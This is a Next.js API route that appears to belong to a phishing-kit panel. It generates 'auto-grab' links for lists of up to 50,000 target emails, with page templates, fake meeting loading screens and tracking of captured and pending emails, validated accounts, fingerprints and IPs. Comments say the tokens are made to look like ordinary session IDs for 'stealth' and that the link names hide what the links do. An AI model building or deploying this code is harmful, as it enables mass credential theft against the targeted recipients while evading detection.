import { NextRequest, NextResponse } from 'next/server'
import { saveLink } from '@/lib/linkDatabase'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const {
      autoGrabFormat,
      autoGrabType,
      redirectType,
      subdomain,
      template,
      loadingScreen,
      loadingDuration,
      link,
      allowedEmails, // Email list for this auto-grab link
    } = body

    // Validate email list
    if (!allowedEmails || !Array.isArray(allowedEmails) || allowedEmails.length === 0) {
      return NextResponse.json(
        { error: 'Email list is required for Type B auto-grab links' },
        { status: 400 }
      )
    }

    if (allowedEmails.length > 50000) {
      return NextResponse.json(
        { error: 'Maximum 50,000 emails allowed' },
        { status: 400 }
      )
    }


    // Generate a legitimate-looking token (no "autograb" prefix - stealth!)
    // Format: timestamp + random alphanumeric (looks like session ID)
    const timestamp = Date.now()
    const randomPart = Math.random().toString(36).substring(2, 8) + Math.random().toString(36).substring(2, 8)
    const token = `${timestamp}_${randomPart}` // Looks like: 1763058004035_a1b2c3d4
    const expiresAt = Date.now() + (30 * 24 * 60 * 60 * 1000) // 30 days default

    // Save link to database
    await saveLink({
      id: `link_${token}`,
      type: 'generic',
      sessionIdentifier: token,
      linkToken: token, // Legacy alias
      name: `GenericLink_${allowedEmails.length}emails`, // Don't reveal it's auto-grab
      email: null,
      allowedEmails: allowedEmails, // Store the email list
      validatedAccounts: [],
      capturedEmails: [], // Legacy alias
      pendingEmails: allowedEmails, // Track which haven't been captured yet
      totalEmails: allowedEmails.length,
      capturedCount: 0,
      pendingCount: allowedEmails.length,
      createdAt: Date.now(),
      expiresAt,
      used: false,
      usedAt: null,
      fingerprint: null,
      ip: null,
      status: 'active',
      templateId: template === 'auto-detect' ? undefined : template,
      templateMode: template === 'auto-detect' ? 'auto' : 'manual',
      loadingScreen: loadingScreen || 'meeting',
      loadingDuration: loadingDuration || 3,
      // Store auto grab configuration in a metadata field (if Link interface supports it)
      // For now, we'll store it in the name or create a separate config
    })

    return NextResponse.json({
      success: true,
      token,
      linkId: `link_${token}`,
      expiresAt,
    })
  } catch (error) {
    return NextResponse.json(
      { error: 'Failed to generate auto grab link' },
      { status: 500 }
    )
  }
}


